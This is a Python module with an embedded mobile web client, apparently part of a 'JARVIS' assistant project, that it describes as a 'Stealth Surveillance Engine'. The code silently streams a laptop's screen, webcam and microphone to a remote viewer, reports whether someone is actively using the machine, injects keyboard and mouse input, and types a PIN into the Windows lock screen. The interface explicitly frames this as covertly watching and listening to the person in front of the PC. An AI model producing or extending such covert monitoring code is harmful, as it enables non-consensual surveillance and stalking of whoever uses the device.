"""
Remote Desktop & Stealth Surveillance Engine for JARVIS (Mark LVI).

Features:
  - Live Screen Streaming (~25 FPS MJPEG) at /remote/stream.
  - Live Webcam Streaming (Face/User) at /remote/cam/stream and /remote/cam.
  - Live Stealth Audio Streaming (Laptop Mic -> Phone Speaker) at /remote/audio.
  - Active Window and Idle/Activity Detection at /api/remote/who.
  - Native Windows User32 Cursor Positioning & Hardware-Level Mouse Clicks.
  - Native Windows SendInput Unicode Keyboard & Dedicated Backspace / Enter / Space.
  - Windows Lock Screen / Sleep Mode Remote Unlock (PIN/Password).
  - Responsive Mobile Client with Picture-in-Picture Webcam, Virtual Keyboard & Audio.
"""
from __future__ import annotations

import ctypes
import json
import os
import queue
import struct
import sys
import threading
import time
from typing import Any, Optional

import cv2
import mss
import numpy as np
import pyperclip

# Native Windows User32 constants
MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_MIDDLEDOWN = 0x0020
MOUSEEVENTF_MIDDLEUP = 0x0040
MOUSEEVENTF_WHEEL = 0x0800

VK_BACK = 0x08
VK_TAB = 0x09
VK_RETURN = 0x0D
VK_SHIFT = 0x10
VK_CONTROL = 0x11
VK_ESCAPE = 0x1B
VK_SPACE = 0x20
VK_LWIN = 0x5B
VK_V = 0x56
KEYEVENTF_KEYUP = 0x0002
KEYEVENTF_UNICODE = 0x0004


def _ensure_default_desktop():
    """Ensure the current thread is attached to the active interactive desktop (default or winlogon)."""
    if os.name == "nt":
        try:
            user32 = ctypes.windll.user32
            # OpenInputDesktop gets whatever desktop is currently receiving user input
            hdesk = user32.OpenInputDesktop(0, False, 0x01FF)
            if not hdesk:
                hdesk = user32.OpenDesktopW("default", 0, False, 0x01FF)
            if hdesk:
                user32.SetThreadDesktop(hdesk)
        except Exception:
            pass


def get_screen_dimensions() -> tuple[int, int]:
    """Get the current desktop width and height in Windows coordinate space."""
    if os.name == "nt":
        try:
            user32 = ctypes.windll.user32
            w = user32.GetSystemMetrics(0)
            h = user32.GetSystemMetrics(1)
            if w > 0 and h > 0:
                return w, h
        except Exception:
            pass
    return 1920, 1080


class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]


def get_user_activity_status() -> dict[str, Any]:
    """Inspects what window is active on the laptop and when it was last touched."""
    _ensure_default_desktop()
    active_title = "Unknown"
    idle_seconds = 999.0

    if os.name == "nt":
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32

            hwnd = user32.GetForegroundWindow()
            buf = ctypes.create_unicode_buffer(512)
            user32.GetWindowTextW(hwnd, buf, 512)
            active_title = buf.value or "Desktop"

            lii = LASTINPUTINFO()
            lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
            if user32.GetLastInputInfo(ctypes.byref(lii)):
                tick = kernel32.GetTickCount()
                idle_seconds = max(0.0, (tick - lii.dwTime) / 1000.0)
        except Exception:
            pass

    return {
        "ok": True,
        "active_window": active_title,
        "idle_seconds": round(idle_seconds, 1),
        "is_actively_in_use": idle_seconds < 15.0,
        "timestamp": time.strftime("%H:%M:%S"),
    }


def get_webcam_snapshot() -> bytes:
    """Captures a single silent snapshot from the laptop's front camera."""
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        ret, frame = cap.read()
        cap.release()
        if ret and frame is not None:
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 70])
            return bytes(buf)
    except Exception:
        pass
    blank = np.zeros((480, 640, 3), dtype=np.uint8)
    cv2.putText(blank, "Camera unavailable", (160, 240), cv2.FONT_HERSHEY_SIMPLEX, 0.9, (255, 255, 255), 2)
    _, buf = cv2.imencode(".jpg", blank)
    return bytes(buf)


def stream_webcam_mjpeg(wfile) -> None:
    """Streams live webcam video (to see who is sitting in front of the laptop) silently."""
    try:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        while True:
            t0 = time.time()
            ret, frame = cap.read()
            if not ret or frame is None:
                time.sleep(0.1)
                continue
            # Resize to 480x360 for light mobile PIP
            resized = cv2.resize(frame, (480, 360), interpolation=cv2.INTER_AREA)
            _, buf = cv2.imencode(".jpg", resized, [cv2.IMWRITE_JPEG_QUALITY, 55])
            frame_bytes = bytes(buf)

            header = (
                b"--frame\r\n"
                b"Content-Type: image/jpeg\r\n"
                b"Content-Length: " + str(len(frame_bytes)).encode("ascii") + b"\r\n\r\n"
            )
            wfile.write(header + frame_bytes + b"\r\n")
            wfile.flush()

            elapsed = time.time() - t0
            if elapsed < 0.08:
                time.sleep(0.08 - elapsed)
    except (ConnectionResetError, BrokenPipeError):
        pass
    except Exception:
        pass
    finally:
        try:
            cap.release()
        except Exception:
            pass


# SendInput structures for robust Unicode character typing
class KEYBDINPUT(ctypes.Structure):
    _fields_ = [
        ("wVk", ctypes.c_ushort),
        ("wScan", ctypes.c_ushort),
        ("dwFlags", ctypes.c_ulong),
        ("time", ctypes.c_ulong),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
    ]


class INPUT(ctypes.Structure):
    _fields_ = [
        ("type", ctypes.c_ulong),
        ("ki", KEYBDINPUT),
        ("pad", ctypes.c_ubyte * 24),
    ]


def _send_unicode_char(ch: str) -> None:
    """Send a single Unicode character using SendInput."""
    user32 = ctypes.windll.user32
    code = ord(ch)

    inp_down = INPUT()
    inp_down.type = 1
    inp_down.ki.wScan = code
    inp_down.ki.dwFlags = KEYEVENTF_UNICODE

    inp_up = INPUT()
    inp_up.type = 1
    inp_up.ki.wScan = code
    inp_up.ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP

    user32.SendInput(1, ctypes.byref(inp_down), ctypes.sizeof(INPUT))
    time.sleep(0.01)
    user32.SendInput(1, ctypes.byref(inp_up), ctypes.sizeof(INPUT))


def _send_vk(vk: int) -> None:
    """Press and release a virtual key code using user32.keybd_event."""
    user32 = ctypes.windll.user32
    user32.keybd_event(vk, 0, 0, 0)
    time.sleep(0.02)
    user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)


def _type_char_direct(ch: str) -> None:
    """Type a single character directly using VkKeyScanW and keybd_event (works on Lock Screen & all fields)."""
    user32 = ctypes.windll.user32
    res = user32.VkKeyScanW(ord(ch))
    if res != -1:
        vk = res & 0xFF
        shift = (res >> 8) & 1
        if shift:
            user32.keybd_event(VK_SHIFT, 0, 0, 0)
        user32.keybd_event(vk, 0, 0, 0)
        time.sleep(0.015)
        user32.keybd_event(vk, 0, KEYEVENTF_KEYUP, 0)
        if shift:
            user32.keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0)
    else:
        # Fallback to keybd_event with unicode scan code
        user32.keybd_event(0, ord(ch), KEYEVENTF_UNICODE, 0)
        time.sleep(0.015)
        user32.keybd_event(0, ord(ch), KEYEVENTF_UNICODE | KEYEVENTF_KEYUP, 0)


def _paste_text(text: str) -> None:
    """Instantly paste text into active application using clipboard + Ctrl+V."""
    user32 = ctypes.windll.user32
    try:
        pyperclip.copy(text)
        time.sleep(0.03)
        user32.keybd_event(VK_CONTROL, 0, 0, 0)
        user32.keybd_event(VK_V, 0, 0, 0)
        time.sleep(0.03)
        user32.keybd_event(VK_V, 0, KEYEVENTF_KEYUP, 0)
        user32.keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0)
    except Exception:
        # Fallback to character-by-character direct typing
        for ch in text:
            _type_char_direct(ch)
            time.sleep(0.01)


def execute_remote_action(action: dict) -> dict:
    """Executes mouse and keyboard actions from remote client with 100% precision."""
    _ensure_default_desktop()
    act = str(action.get("action", "")).strip().lower()
    user32 = ctypes.windll.user32

    screen_w, screen_h = get_screen_dimensions()

    rel_x = float(action.get("x", 0.0))
    rel_y = float(action.get("y", 0.0))
    x = int(max(0.0, min(1.0, rel_x)) * screen_w)
    y = int(max(0.0, min(1.0, rel_y)) * screen_h)
    btn = str(action.get("btn", "left")).lower()

    try:
        if act == "move":
            user32.SetCursorPos(x, y)

        elif act == "click":
            user32.SetCursorPos(x, y)
            time.sleep(0.02)
            if btn == "right":
                user32.mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
                time.sleep(0.03)
                user32.mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
            else:
                user32.mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                time.sleep(0.03)
                user32.mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)

        elif act == "down":
            user32.SetCursorPos(x, y)
            time.sleep(0.01)
            user32.mouse_event(MOUSEEVENTF_RIGHTDOWN if btn == "right" else MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)

        elif act == "up":
            user32.SetCursorPos(x, y)
            time.sleep(0.01)
            user32.mouse_event(MOUSEEVENTF_RIGHTUP if btn == "right" else MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)

        elif act == "double_click":
            user32.SetCursorPos(x, y)
            time.sleep(0.02)
            for _ in range(2):
                user32.mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
                time.sleep(0.03)
                user32.mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
                time.sleep(0.05)

        elif act == "right_click":
            user32.SetCursorPos(x, y)
            time.sleep(0.02)
            user32.mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
            time.sleep(0.03)
            user32.mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)

        elif act == "scroll":
            dy = int(action.get("dy", 0))
            user32.mouse_event(MOUSEEVENTF_WHEEL, 0, 0, dy, 0)

        elif act == "type":
            text = str(action.get("text", ""))
            mode = action.get("mode", "auto")
            # If multi-character text or standard string, paste via clipboard for instant delivery
            # Otherwise or if mode == "keys", type via direct scan codes
            if mode == "keys" or len(text) == 1:
                for ch in text:
                    _type_char_direct(ch)
                    time.sleep(0.015)
            else:
                _paste_text(text)

        elif act == "key":
            key = str(action.get("key", "")).lower()
            if key in ("backspace", "back", "del_prev", "bksp"):
                _send_vk(VK_BACK)
            elif key in ("enter", "return"):
                _send_vk(VK_RETURN)
            elif key in ("space", "spacebar"):
                _send_vk(VK_SPACE)
            elif key in ("esc", "escape"):
                _send_vk(VK_ESCAPE)
            elif key in ("tab",):
                _send_vk(VK_TAB)
            elif key in ("win", "windows", "start"):
                _send_vk(VK_LWIN)

        elif act == "unlock":
            # Remote Windows Lock Screen / Sleep Mode Unlock
            password = str(action.get("password", ""))
            
            # Ensure attached to input desktop
            _ensure_default_desktop()
            
            # 1. Wake screen if asleep by simulating slight mouse motion
            user32.mouse_event(MOUSEEVENTF_MOVE, 5, 5, 0, 0)
            time.sleep(0.05)
            user32.mouse_event(MOUSEEVENTF_MOVE, -5, -5, 0, 0)
            time.sleep(0.05)

            # 2. Dismiss lock screen wallpaper / screensaver (Spacebar or Enter)
            _send_vk(VK_SPACE)
            time.sleep(0.1)
            _send_vk(VK_SPACE)
            time.sleep(0.7)  # wait for PIN/password input box animation & focus
            
            # 3. Type PIN / Password directly character-by-character into Windows credential provider
            for ch in password:
                _type_char_direct(ch)
                time.sleep(0.035)
                
            time.sleep(0.2)
            # 4. Press Enter to submit password / PIN
            _send_vk(VK_RETURN)

        return {"ok": True, "action": act, "x": x, "y": y}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def stream_mjpeg(wfile) -> None:
    """Streams live JPEG frames as multipart/x-mixed-replace at ~25 FPS."""
    _ensure_default_desktop()
    with mss.MSS() as sct:
        mon = sct.monitors[1]
        while True:
            t0 = time.time()
            try:
                shot = sct.grab(mon)
                raw = np.frombuffer(shot.raw, dtype=np.uint8).reshape((shot.height, shot.width, 4))
                # 1024x576 for ultra smooth 25 FPS stream
                resized = cv2.resize(raw[:, :, :3], (1024, 576), interpolation=cv2.INTER_NEAREST)
                _, buf = cv2.imencode(".jpg", resized, [cv2.IMWRITE_JPEG_QUALITY, 55])
                frame_bytes = bytes(buf)

                header = (
                    b"--frame\r\n"
                    b"Content-Type: image/jpeg\r\n"
                    b"Content-Length: " + str(len(frame_bytes)).encode("ascii") + b"\r\n\r\n"
                )
                wfile.write(header + frame_bytes + b"\r\n")
                wfile.flush()

                elapsed = time.time() - t0
                if elapsed < 0.04:
                    time.sleep(0.04 - elapsed)
            except (ConnectionResetError, BrokenPipeError):
                break
            except Exception:
                time.sleep(0.1)


def make_wav_header(sample_rate: int = 16000, channels: int = 1, bits_per_sample: int = 16) -> bytes:
    """Generate a 44-byte streaming WAV header with maximum chunk length."""
    data_size = 0x7FFFFFFF
    byte_rate = sample_rate * channels * (bits_per_sample // 8)
    block_align = channels * (bits_per_sample // 8)
    return struct.pack(
        "<4sI4s4sIHHIIHH4sI",
        b"RIFF", data_size + 36, b"WAVE",
        b"fmt ", 16, 1, channels, sample_rate, byte_rate, block_align, bits_per_sample,
        b"data", data_size
    )


def stream_mic_audio(wfile) -> None:
    """Streams live audio from the laptop microphone directly to client (Stealth Surveillance)."""
    try:
        import sounddevice as sd
    except Exception:
        return

    sample_rate = 16000
    channels = 1
    bits = 16

    try:
        wfile.write(make_wav_header(sample_rate, channels, bits))
        wfile.flush()
    except Exception:
        return

    q = queue.Queue(maxsize=40)

    def callback(indata, frames, time_info, status):
        try:
            q.put_nowait(bytes(indata))
        except queue.Full:
            pass

    try:
        with sd.RawInputStream(samplerate=sample_rate, channels=channels, dtype="int16", callback=callback, blocksize=1024):
            while True:
                try:
                    chunk = q.get(timeout=2.0)
                    wfile.write(chunk)
                    wfile.flush()
                except queue.Empty:
                    continue
                except (ConnectionResetError, BrokenPipeError):
                    break
    except Exception:
        pass


def get_remote_html() -> str:
    """Returns the touch-optimized responsive live screen, stealth webcam PIP & audio viewer client."""
    return """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
  <title>JARVIS Stealth Remote Desktop</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-user-select: none; }
    body, html { width: 100%; height: 100%; background: #070912; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: #fff; }
    #container { position: relative; width: 100%; height: 100%; display: flex; flex-direction: column; }
    #screen-wrap { flex: 1; position: relative; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; touch-action: none; }
    #screen-img { max-width: 100%; max-height: 100%; object-fit: contain; display: block; border-radius: 4px; pointer-events: auto; }
    #toolbar { height: 50px; background: #0c1020; border-top: 1px solid #1f2740; display: flex; align-items: center; justify-content: space-around; padding: 0 4px; z-index: 100; flex-shrink: 0; }
    .btn { background: #1a2238; color: #8b9cff; border: 1px solid #2e3a60; border-radius: 8px; padding: 7px 7px; font-size: 11px; font-weight: 600; cursor: pointer; display: flex; align-items: center; gap: 3px; }
    .btn:active { background: #8b9cff; color: #000; }
    .btn.active { background: #5af2b0; color: #000; border-color: #5af2b0; }
    
    #status { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 5px 12px; border-radius: 20px; font-size: 11px; color: #5af2b0; border: 1px solid rgba(255,255,255,0.12); pointer-events: none; z-index: 50; }
    #who-pill { position: absolute; top: 10px; right: 10px; background: rgba(0,0,0,0.8); padding: 5px 12px; border-radius: 20px; font-size: 11px; color: #ff7ab6; border: 1px solid rgba(255,122,182,0.3); pointer-events: none; z-index: 50; max-width: 60%; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; }
    #dot { position: absolute; width: 22px; height: 22px; border-radius: 50%; background: rgba(90, 242, 176, 0.45); border: 2px solid #5af2b0; transform: translate(-50%, -50%); pointer-events: none; display: none; z-index: 60; }
    
    /* Stealth Webcam PIP Window */
    #cam-pip { position: absolute; bottom: 60px; right: 12px; width: 140px; height: 105px; background: #0c1020; border: 2px solid #ff7ab6; border-radius: 10px; overflow: hidden; z-index: 90; box-shadow: 0 4px 15px rgba(0,0,0,0.7); display: none; }
    #cam-pip.visible { display: block; }
    #cam-img { width: 100%; height: 100%; object-fit: cover; }
    #cam-label { position: absolute; bottom: 0; left: 0; right: 0; background: rgba(0,0,0,0.7); font-size: 9px; padding: 2px 4px; text-align: center; color: #fff; }

    /* Virtual Keyboard Drawer */
    #kb-drawer { display: none; background: #0c1020; border-top: 1px solid #2e3a60; padding: 8px 10px; z-index: 95; }
    #kb-drawer.open { display: block; }
    #kb-row { display: flex; gap: 6px; align-items: center; }
    #kb-input { flex: 1; background: #151b30; border: 1px solid #2e3a60; color: #fff; padding: 8px 10px; border-radius: 8px; font-size: 14px; outline: none; }
    .kb-action-btn { background: #242e4c; color: #fff; border: 1px solid #3c4c7c; border-radius: 8px; padding: 8px 11px; font-size: 13px; font-weight: bold; cursor: pointer; }
    .kb-action-btn:active { background: #8b9cff; color: #000; }
  </style>
</head>
<body>
  <div id="container">
    <div id="screen-wrap">
      <div id="status">● Screen Live</div>
      <div id="who-pill">Detecting user...</div>
      <img id="screen-img" src="/remote/stream" alt="Laptop Screen Live" />
      <div id="dot"></div>

      <!-- Stealth Webcam PIP (Shows WHO is in front of the laptop) -->
      <div id="cam-pip">
        <img id="cam-img" src="/remote/cam" alt="Person Webcam" />
        <div id="cam-label">👤 In front of PC</div>
      </div>
    </div>

    <!-- Virtual Keyboard Drawer -->
    <div id="kb-drawer">
      <div id="kb-row">
        <input type="text" id="kb-input" placeholder="Type here & press Send..." />
        <button class="kb-action-btn" id="btn-kb-send">Send</button>
        <button class="kb-action-btn" id="btn-kb-back">⌫ Back</button>
        <button class="kb-action-btn" id="btn-kb-enter">↵ Enter</button>
        <button class="kb-action-btn" id="btn-kb-space">␣ Space</button>
      </div>
    </div>

    <!-- Audio Player for Stealth Surveillance -->
    <audio id="stealth-audio" preload="none"></audio>

    <div id="toolbar">
      <button class="btn" id="btn-click">🖱️ Click</button>
      <button class="btn" id="btn-right">👆 Right</button>
      <button class="btn" id="btn-double">⚡ 2x</button>
      <button class="btn" id="btn-backspace">⌫ Back</button>
      <button class="btn" id="btn-kb-toggle">⌨️ Type</button>
      <button class="btn" id="btn-cam">📷 Person</button>
      <button class="btn" id="btn-audio">🎧 Voice Off</button>
      <button class="btn" id="btn-unlock">🔓 Unlock</button>
      <button class="btn" id="btn-refresh">🔄</button>
    </div>
  </div>

  <script>
    const img = document.getElementById('screen-img');
    const dot = document.getElementById('dot');
    const status = document.getElementById('status');
    const whoPill = document.getElementById('who-pill');
    const camPip = document.getElementById('cam-pip');
    const camImg = document.getElementById('cam-img');
    const btnCam = document.getElementById('btn-cam');
    const kbDrawer = document.getElementById('kb-drawer');
    const kbInput = document.getElementById('kb-input');
    const stealthAudio = document.getElementById('stealth-audio');
    const btnAudio = document.getElementById('btn-audio');

    img.onerror = () => {
      status.innerText = "Reconnecting screen...";
      status.style.color = "#ff5470";
      setTimeout(() => { img.src = "/remote/stream?t=" + Date.now(); }, 1200);
    };

    img.onload = () => {
      status.innerText = "● Screen Live";
      status.style.color = "#5af2b0";
    };

    // Poll who is using laptop and active window every 4 seconds
    async function checkWhoIsUsing() {
      try {
        const res = await fetch('/api/remote/who');
        const data = await res.json();
        if (data.ok) {
          const app = data.active_window || "Desktop";
          const inUse = data.is_actively_in_use;
          whoPill.innerText = (inUse ? "🔴 In Use: " : "⚪ Idle: ") + app;
          whoPill.style.color = inUse ? "#5af2b0" : "#ff7ab6";
        }
      } catch (_) {}
    }
    checkWhoIsUsing();
    setInterval(checkWhoIsUsing, 4000);

    function sendAction(act) {
      fetch('/api/remote/control', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(act)
      }).catch(() => {});
    }

    function getCoords(clientX, clientY) {
      const rect = img.getBoundingClientRect();
      if (clientX < rect.left || clientX > rect.right || clientY < rect.top || clientY > rect.bottom) {
        return null;
      }
      return {
        x: Math.max(0, Math.min(1, (clientX - rect.left) / rect.width)),
        y: Math.max(0, Math.min(1, (clientY - rect.top) / rect.height))
      };
    }

    let isDrag = false;
    let touchDownPos = { x: 0.5, y: 0.5 };
    let touchDownTime = 0;
    let lastTapTime = 0;
    let longPressTimer = null;

    img.addEventListener('pointerdown', (e) => {
      const p = getCoords(e.clientX, e.clientY);
      if (!p) return;
      touchDownPos = p;
      touchDownTime = Date.now();
      isDrag = false;

      dot.style.left = e.clientX + 'px';
      dot.style.top = e.clientY + 'px';
      dot.style.display = 'block';

      if (longPressTimer) clearTimeout(longPressTimer);
      longPressTimer = setTimeout(() => {
        if (!isDrag) {
          if (navigator.vibrate) navigator.vibrate(60);
          sendAction({ action: 'right_click', x: touchDownPos.x, y: touchDownPos.y });
          dot.style.borderColor = '#ff5470';
          setTimeout(() => { dot.style.display = 'none'; dot.style.borderColor = '#5af2b0'; }, 300);
        }
      }, 600);
    });

    img.addEventListener('pointermove', (e) => {
      const p = getCoords(e.clientX, e.clientY);
      if (!p) return;
      const dist = Math.hypot(p.x - touchDownPos.x, p.y - touchDownPos.y);
      if (dist > 0.015) {
        isDrag = true;
        if (longPressTimer) clearTimeout(longPressTimer);
        dot.style.left = e.clientX + 'px';
        dot.style.top = e.clientY + 'px';
        sendAction({ action: 'move', x: p.x, y: p.y });
      }
    });

    img.addEventListener('pointerup', (e) => {
      if (longPressTimer) clearTimeout(longPressTimer);
      dot.style.display = 'none';
      const p = getCoords(e.clientX, e.clientY) || touchDownPos;
      const duration = Date.now() - touchDownTime;

      if (!isDrag && duration < 600) {
        const now = Date.now();
        if (now - lastTapTime < 350) {
          sendAction({ action: 'double_click', x: p.x, y: p.y });
          lastTapTime = 0;
        } else {
          lastTapTime = now;
          sendAction({ action: 'click', btn: 'left', x: p.x, y: p.y });
        }
      } else if (isDrag) {
        sendAction({ action: 'up', btn: 'left', x: p.x, y: p.y });
      }
    });

    img.addEventListener('wheel', (e) => {
      e.preventDefault();
      const p = getCoords(e.clientX, e.clientY) || touchDownPos;
      sendAction({ action: 'scroll', dy: e.deltaY < 0 ? 120 : -120, x: p.x, y: p.y });
    }, { passive: false });

    // Toolbar actions
    document.getElementById('btn-click').onclick = () => sendAction({ action: 'click', btn: 'left', ...touchDownPos });
    document.getElementById('btn-right').onclick = () => sendAction({ action: 'right_click', ...touchDownPos });
    document.getElementById('btn-double').onclick = () => sendAction({ action: 'double_click', ...touchDownPos });
    document.getElementById('btn-backspace').onclick = () => sendAction({ action: 'key', key: 'backspace' });
    document.getElementById('btn-refresh').onclick = () => { img.src = "/remote/stream?t=" + Date.now(); };

    // Toggle Webcam PIP to see person in front of laptop
    let camActive = false;
    let camInterval = null;
    btnCam.onclick = () => {
      camActive = !camActive;
      if (camActive) {
        camPip.classList.add('visible');
        btnCam.classList.add('active');
        btnCam.innerText = "📷 Person (On)";
        camImg.src = "/remote/cam?t=" + Date.now();
        camInterval = setInterval(() => {
          camImg.src = "/remote/cam?t=" + Date.now();
        }, 1500);
      } else {
        camPip.classList.remove('visible');
        btnCam.classList.remove('active');
        btnCam.innerText = "📷 Person";
        if (camInterval) clearInterval(camInterval);
      }
    };

    // Keyboard Drawer Toggle
    document.getElementById('btn-kb-toggle').onclick = () => {
      kbDrawer.classList.toggle('open');
      if (kbDrawer.classList.contains('open')) {
        kbInput.focus();
      }
    };

    document.getElementById('btn-kb-send').onclick = () => {
      const val = kbInput.value;
      if (val) {
        sendAction({ action: 'type', text: val });
        kbInput.value = '';
      }
    };

    document.getElementById('btn-kb-back').onclick = () => sendAction({ action: 'key', key: 'backspace' });
    document.getElementById('btn-kb-enter').onclick = () => sendAction({ action: 'key', key: 'enter' });
    document.getElementById('btn-kb-space').onclick = () => sendAction({ action: 'key', key: 'space' });

    kbInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        document.getElementById('btn-kb-send').click();
      } else if (e.key === 'Backspace' && kbInput.value.length === 0) {
        sendAction({ action: 'key', key: 'backspace' });
      }
    });

    // Remote Windows Lock Screen Unlock
    document.getElementById('btn-unlock').onclick = () => {
      const pwd = prompt('Enter your Windows PIN / Password to unlock laptop:');
      if (pwd) {
        sendAction({ action: 'unlock', password: pwd });
      }
    };

    // Stealth Surveillance Voice / Room Audio Toggle
    let isListening = false;
    btnAudio.onclick = () => {
      if (!isListening) {
        stealthAudio.src = "/remote/audio?t=" + Date.now();
        stealthAudio.play().then(() => {
          isListening = true;
          btnAudio.classList.add('active');
          btnAudio.innerText = "🎧 Voice ON";
        }).catch((err) => {
          alert('Audio play error: ' + err);
        });
      } else {
        stealthAudio.pause();
        stealthAudio.src = "";
        isListening = false;
        btnAudio.classList.remove('active');
        btnAudio.innerText = "🎧 Voice Off";
      }
    };
  </script>
</body>
</html>"""
